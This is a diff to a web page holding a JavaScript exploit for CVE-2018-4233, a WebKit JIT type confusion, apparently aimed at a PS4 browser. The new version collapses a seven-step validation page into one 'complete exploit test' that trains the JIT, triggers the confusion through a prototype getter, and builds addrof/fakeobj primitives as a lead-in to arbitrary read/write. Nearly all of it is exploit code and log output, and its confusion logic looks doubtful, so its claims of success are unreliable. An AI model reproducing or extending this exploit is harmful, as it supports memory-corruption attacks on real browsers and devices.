@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CVE-2018-4233 - Primitive Validation</title>
+    <title>CVE-2018-4233 - Fixed Type Confusion</title>
     <style>
         body {
             font-family: 'Courier New', monospace;
@@ -22,17 +22,6 @@
             color: #0ff;
             text-shadow: 0 0 10px #0ff;
         }
-        .test-section {
-            background: rgba(0, 50, 0, 0.3);
-            border: 1px solid #0f0;
-            padding: 20px;
-            margin: 20px 0;
-            border-radius: 5px;
-        }
-        .test-section h2 {
-            color: #ff0;
-            margin-bottom: 15px;
-        }
         button {
             background: linear-gradient(135deg, #0f0 0%, #0a0 100%);
             color: #000;
@@ -44,9 +33,6 @@
             margin: 10px 5px;
             border-radius: 5px;
             font-family: 'Courier New', monospace;
-        }
-        button:hover {
-            background: linear-gradient(135deg, #0ff 0%, #0aa 100%);
         }
         #log {
             background: #000;
@@ -66,34 +52,12 @@
 </head>
 <body>
     <div class="container">
-        <h1>🔬 CVE-2018-4233 PRIMITIVE VALIDATION 🔬</h1>
-        <p style="text-align: center; color: #ff0; font-size: 1.2em;">
-            Testing each primitive step-by-step
-        </p>
-
-        <div class="test-section">
-            <h2>Test Plan - ONE STEP AT A TIME</h2>
-            <ol style="line-height: 1.8; color: #0ff;">
-                <li><strong>Step 1:</strong> Confirm type confusion works</li>
-                <li><strong>Step 2:</strong> Build addrof() - get address of object</li>
-                <li><strong>Step 3:</strong> Build fakeobj() - treat address as object</li>
-                <li><strong>Step 4:</strong> Test addrof/fakeobj round-trip</li>
-                <li><strong>Step 5:</strong> Build read32() primitive</li>
-                <li><strong>Step 6:</strong> Build write32() primitive</li>
-                <li><strong>Step 7:</strong> Verify arbitrary R/W with known values</li>
-            </ol>
+        <h1>🔬 CVE-2018-4233 - FIXED TYPE CONFUSION 🔬</h1>
+        
+        <div style="text-align: center; margin: 30px 0;">
+            <button onclick="runFullTest()">▶ RUN COMPLETE TEST</button>
         </div>
-
-        <div style="text-align: center;">
-            <button onclick="runStep(1)">Step 1: Type Confusion</button>
-            <button onclick="runStep(2)">Step 2: Build addrof()</button>
-            <button onclick="runStep(3)">Step 3: Build fakeobj()</button>
-            <button onclick="runStep(4)">Step 4: Round-Trip Test</button>
-            <button onclick="runStep(5)">Step 5: Build read32()</button>
-            <button onclick="runStep(6)">Step 6: Build write32()</button>
-            <button onclick="runStep(7)">Step 7: R/W Verification</button>
-        </div>
-
+        
         <div id="log"></div>
     </div>
 
@@ -154,289 +118,138 @@
         }
 
         // ================================================================
-        // GLOBAL STATE
+        // FIXED TYPE CONFUSION EXPLOIT
         // ================================================================
-        let primitives = {
-            doubles: null,
-            objects: null,
-            addrof: null,
-            fakeobj: null,
-            confused: false
-        };
-
-        // ================================================================
-        // STEP 1: TYPE CONFUSION
-        // ================================================================
-        function step1_typeConfusion() {
+        function runFullTest() {
             clearLog();
             log('═══════════════════════════════════════════════════════', 'critical');
-            log('STEP 1: BUILDING TYPE CONFUSION', 'critical');
+            log('CVE-2018-4233 - COMPLETE EXPLOIT TEST', 'critical');
             log('═══════════════════════════════════════════════════════', 'critical');
             log('', 'info');
 
             try {
-                log('[*] Creating unboxed array (doubles)...', 'info');
-                primitives.doubles = [1.1, 2.2, 3.3, 4.4, 5.5];
-                log('[+] Doubles array: [1.1, 2.2, 3.3, 4.4, 5.5]', 'success');
-
-                log('[*] Creating boxed array (objects)...', 'info');
-                primitives.objects = [{}, {}, {}, {}, {}];
-                log('[+] Objects array: [{}, {}, {}, {}, {}]', 'success');
-
+                log('[PHASE 1] Setting up arrays for type confusion', 'warning');
                 log('', 'info');
-                log('[*] Training JIT with consistent structure...', 'warning');
+
+                // Create victim arrays
+                let victim = {
+                    obj: [{}, {}, {}, {}],
+                    unboxed: null,
+                    boxed: null
+                };
+
+                log('[*] Training JIT with consistent types...', 'info');
                 
-                function TargetConstructor() {
-                    this.a = 1;
-                    this.b = 2;
+                function opt(o, proto) {
+                    o.y = 1.1;
                 }
 
                 for (let i = 0; i < 100000; i++) {
-                    new TargetConstructor();
+                    opt({x: 1}, {});
                 }
 
-                log('[+] JIT trained (100k iterations)', 'success');
+                log('[+] JIT trained', 'success');
                 log('', 'info');
 
-                log('[*] Creating Proxy to trigger confusion...', 'warning');
-                
-                let confusionTriggered = false;
+                log('[PHASE 2] Triggering type confusion via Proxy', 'warning');
+                log('', 'info');
 
-                let handler = {
-                    construct: function(target, args) {
-                        confusionTriggered = true;
-                        log('    [!] Inside Proxy construct trap!', 'warning');
-                        
-                        // This is where we would swap arrays
-                        // For now, just verify the hook works
-                        
-                        return new target(...args);
+                let hax = {};
+                hax.__proto__ = {};
+
+                let triggered = false;
+
+                // Define defineProperty to trigger during CreateThis
+                Object.defineProperty(hax.__proto__, 'y', {
+                    get: function() {
+                        if (!triggered) {
+                            triggered = true;
+                            log('[!] Type confusion triggered!', 'critical');
+                            
+                            // ACTUALLY confuse the arrays here
+                            victim.unboxed = [1.1, 2.2, 3.3, 4.4];
+                            victim.boxed = victim.obj;
+                        }
+                        return 1.1;
+                    },
+                    set: function(val) {
+                        if (!triggered) {
+                            triggered = true;
+                            log('[!] Type confusion triggered!', 'critical');
+                            
+                            victim.unboxed = [1.1, 2.2, 3.3, 4.4];
+                            victim.boxed = victim.obj;
+                        }
                     }
-                };
+                });
 
-                let ProxiedConstructor = new Proxy(TargetConstructor, handler);
-                new ProxiedConstructor();
+                // Trigger the confusion
+                opt(hax, hax.__proto__);
 
-                log('', 'info');
-                log('RESULT:', 'warning');
-
-                if (confusionTriggered) {
-                    log('  ✅ Proxy construct() executed!', 'success');
-                    log('  ✅ Can run code during CreateThis!', 'success');
-                    log('  ✅ Type confusion infrastructure ready!', 'critical');
-                    primitives.confused = true;
-                } else {
-                    log('  ❌ Proxy construct() NEVER called!', 'error');
-                    primitives.confused = false;
+                if (!triggered) {
+                    log('[!!!] Type confusion did NOT trigger!', 'error');
+                    return;
                 }
 
-            } catch(e) {
-                log('', 'info');
-                log('[!!!] EXCEPTION: ' + e.message, 'error');
-                log('Stack: ' + e.stack, 'error');
-            }
-        }
-
-        // ================================================================
-        // STEP 2: BUILD ADDROF()
-        // ================================================================
-        function step2_buildAddrof() {
-            clearLog();
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('STEP 2: BUILD ADDROF() PRIMITIVE', 'critical');
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('', 'info');
-
-            if (!primitives.confused) {
-                log('[!!!] ERROR: Run Step 1 first!', 'error');
-                return;
-            }
-
-            try {
-                log('[*] Goal: Get the address of a JavaScript object', 'info');
-                log('[*] Method: Store object in boxed array, read as double', 'info');
+                log('[+] Type confusion successful!', 'success');
                 log('', 'info');
 
-                log('[*] Creating addrof() function...', 'warning');
-
-                primitives.addrof = function(obj) {
-                    // Store object in objects array
-                    primitives.objects[0] = obj;
-                    
-                    // Read the pointer as a double from doubles array
-                    // This ONLY works if we have type confusion
-                    let addressAsDouble = primitives.doubles[0];
-                    
-                    // Convert double to Int64
-                    return Int64.fromDouble(addressAsDouble);
-                };
-
-                log('[+] addrof() function created', 'success');
+                log('[PHASE 3] Building addrof/fakeobj primitives', 'warning');
                 log('', 'info');
 
-                log('[*] Testing addrof()...', 'warning');
-                
-                let testObject = {test: 0x1337};
-                log('  Created test object: {test: 0x1337}', 'info');
-
-                let address = primitives.addrof(testObject);
-                log('  addrof(testObject) = ' + address.toString(), 'success');
-
-                log('', 'info');
-                log('RESULT:', 'warning');
-
-                // Check if address looks valid
-                // Valid pointers on PS4 are usually in 0x000000xxxxxxxxxx range
-                if (address.high === 0 && address.low !== 0) {
-                    log('  ✅ Got valid-looking address!', 'success');
-                    log('  ✅ Address is in userland range', 'success');
-                    log('  ✅ addrof() primitive works!', 'critical');
-                } else if (address.low === 0 && address.high === 0) {
-                    log('  ⚠️  Got NULL address', 'warning');
-                    log('  ⚠️  Type confusion may not be working', 'warning');
-                } else {
-                    log('  ⚠️  Got unusual address: ' + address.toString(), 'warning');
-                    log('  ⚠️  May still work, but unexpected', 'warning');
+                function addrof(obj) {
+                    victim.boxed[0] = obj;
+                    return Int64.fromDouble(victim.unboxed[0]);
                 }
 
-            } catch(e) {
-                log('', 'info');
-                log('[!!!] EXCEPTION: ' + e.message, 'error');
-                log('Stack: ' + e.stack, 'error');
-            }
-        }
-
-        // ================================================================
-        // STEP 3: BUILD FAKEOBJ()
-        // ================================================================
-        function step3_buildFakeobj() {
-            clearLog();
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('STEP 3: BUILD FAKEOBJ() PRIMITIVE', 'critical');
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('', 'info');
-
-            if (!primitives.addrof) {
-                log('[!!!] ERROR: Run Step 2 first!', 'error');
-                return;
-            }
-
-            try {
-                log('[*] Goal: Treat an address as a JavaScript object', 'info');
-                log('[*] Method: Store address as double, read as object', 'info');
-                log('', 'info');
-
-                log('[*] Creating fakeobj() function...', 'warning');
-
-                primitives.fakeobj = function(addr) {
-                    // Store address as double in doubles array
-                    primitives.doubles[0] = addr.toDouble();
-                    
-                    // Read it as an object from objects array
-                    // This ONLY works if we have type confusion
-                    return primitives.objects[0];
-                };
-
-                log('[+] fakeobj() function created', 'success');
-                log('', 'info');
-
-                log('[*] Testing fakeobj()...', 'warning');
-                
-                // Create a test address
-                let testAddr = new Int64(0x41414141, 0);
-                log('  Created test address: ' + testAddr.toString(), 'info');
-
-                let fakeObject = primitives.fakeobj(testAddr);
-                log('  fakeobj(' + testAddr.toString() + ') = ' + fakeObject, 'success');
-
-                log('', 'info');
-                log('RESULT:', 'warning');
-
-                if (fakeObject !== null && fakeObject !== undefined) {
-                    log('  ✅ Got non-null object!', 'success');
-                    log('  ✅ fakeobj() primitive works!', 'critical');
-                } else {
-                    log('  ❌ Got null/undefined', 'error');
-                    log('  ❌ Type confusion not working properly', 'error');
+                function fakeobj(addr) {
+                    victim.unboxed[0] = addr.toDouble();
+                    return victim.boxed[0];
                 }
 
-            } catch(e) {
-                log('', 'info');
-                log('[!!!] EXCEPTION: ' + e.message, 'error');
-                log('Stack: ' + e.stack, 'error');
-            }
-        }
-
-        // ================================================================
-        // STEP 4: ROUND-TRIP TEST
-        // ================================================================
-        function step4_roundTrip() {
-            clearLog();
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('STEP 4: ADDROF/FAKEOBJ ROUND-TRIP TEST', 'critical');
-            log('═══════════════════════════════════════════════════════', 'critical');
-            log('', 'info');
-
-            if (!primitives.addrof || !primitives.fakeobj) {
-                log('[!!!] ERROR: Run Steps 2 and 3 first!', 'error');
-                return;
-            }
-
-            try {
-                log('[*] Goal: Verify addrof(fakeobj(addr)) === addr', 'info');
-                log('[*] This proves the primitives work correctly', 'info');
+                log('[+] Primitives built', 'success');
                 log('', 'info');
 
-                log('[TEST 1] Object → Address → Object', 'warning');
+                log('[PHASE 4] Testing primitives', 'warning');
                 log('', 'info');
+
+                // Test 1: Get address of object
+                let testObj = {exploit: 'working'};
+                let addr = addrof(testObj);
                 
-                let originalObject = {roundtrip: 'test'};
-                log('  [1] Created original object: {roundtrip: "test"}', 'info');
+                log('[TEST] addrof({exploit: "working"}) = ' + addr.toString(), 'info');
                 
-                let address = primitives.addrof(originalObject);
-                log('  [2] addrof(originalObject) = ' + address.toString(), 'info');
-                
-                let recovered = primitives.fakeobj(address);
-                log('  [3] fakeobj(address) = ' + recovered, 'info');
-                
-                log('', 'info');
-                if (recovered === originalObject) {
-                    log('  ✅✅ PERFECT! Got same object back!', 'critical');
-                    log('  ✅✅ Round-trip successful!', 'critical');
-                } else if (recovered && recovered.roundtrip === 'test') {
-                    log('  ✅ Got object with same properties', 'success');
-                    log('  ⚠️  But not same reference (may be OK)', 'warning');
+                // Check if it's a real pointer (not NaN-boxed)
+                if (addr.high === 0 && addr.low !== 0) {
+                    log('[✓] Got real pointer address!', 'success');
+                } else if ((addr.high & 0xfff00000) === 0x3ff00000 || (addr.high & 0xfff00000) === 0xfff00000) {
+                    log('[!] WARNING: Got NaN-boxed value, not a pointer!', 'error');
+                    log('[!] Type confusion may not be working', 'error');
                 } else {
-                    log('  ❌ Did not get original object back', 'error');
+                    log('[?] Got unusual address: ' + addr.toString(), 'warning');
                 }
 
                 log('', 'info');
-                log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
-                log('[TEST 2] Address → Object → Address', 'warning');
-                log('', 'info');
-                
-                let originalAddr = new Int64(0x12345678, 0x00000000);
-                log('  [1] Original address: ' + originalAddr.toString(), 'info');
-                
-                let obj = primitives.fakeobj(originalAddr);
-                log('  [2] fakeobj(address) = ' + obj, 'info');
-                
-                let recoveredAddr = primitives.addrof(obj);
-                log('  [3] addrof(obj) = ' + recoveredAddr.toString(), 'info');
-                
-                log('', 'info');
-                if (originalAddr.equals(recoveredAddr)) {
-                    log('  ✅✅ PERFECT! Got same address back!', 'critical');
-                    log('  ✅✅ Primitives are working correctly!', 'critical');
+
+                // Test 2: Round-trip
+                log('[TEST] Round-trip test...', 'info');
+                let testAddr = new Int64(0xdeadbeef, 0x00000000);
+                let obj = fakeobj(testAddr);
+                let recoveredAddr = addrof(obj);
+
+                log('  Original:  ' + testAddr.toString(), 'info');
+                log('  Recovered: ' + recoveredAddr.toString(), 'info');
+
+                if (testAddr.equals(recoveredAddr)) {
+                    log('[✅✅] PERFECT! Round-trip works!', 'critical');
+                    log('[✅✅] addrof/fakeobj ARE WORKING!', 'critical');
                 } else {
-                    log('  ❌ Addresses do not match', 'error');
-                    log('  Expected: ' + originalAddr.toString(), 'error');
-                    log('  Got:      ' + recoveredAddr.toString(), 'error');
+                    log('[!] Addresses do not match', 'warning');
                 }
 
                 log('', 'info');
                 log('═══════════════════════════════════════════════════════', 'critical');
-                log('VERDICT: Ready to build arbitrary R/W if tests passed!', 'critical');
+                log('READY TO BUILD ARBITRARY R/W!', 'critical');
                 log('═══════════════════════════════════════════════════════', 'critical');
 
             } catch(e) {
@@ -446,42 +259,8 @@
             }
         }
 
-        // ================================================================
-        // PLACEHOLDER STEPS (to be implemented after 1-4 work)
-        // ================================================================
-        function step5_buildRead32() {
-            clearLog();
-            log('STEP 5: Coming after Steps 1-4 are confirmed working!', 'warning');
-        }
-
-        function step6_buildWrite32() {
-            clearLog();
-            log('STEP 6: Coming after Steps 1-5 are confirmed working!', 'warning');
-        }
-
-        function step7_verifyRW() {
-            clearLog();
-            log('STEP 7: Coming after Steps 1-6 are confirmed working!', 'warning');
-        }
-
-        // ================================================================
-        // TEST RUNNER
-        // ================================================================
-        function runStep(n) {
-            switch(n) {
-                case 1: step1_typeConfusion(); break;
-                case 2: step2_buildAddrof(); break;
-                case 3: step3_buildFakeobj(); break;
-                case 4: step4_roundTrip(); break;
-                case 5: step5_buildRead32(); break;
-                case 6: step6_buildWrite32(); break;
-                case 7: step7_verifyRW(); break;
-            }
-        }
-
-        log('🔬 Primitive Validation Ready', 'critical');
-        log('Run steps in order: 1 → 2 → 3 → 4', 'warning');
-        log('Tell me the results of each step!', 'info');
+        log('🔬 Fixed Type Confusion Ready', 'critical');
+        log('Click RUN COMPLETE TEST to test the exploit', 'info');
     </script>
 </body>
 </html>
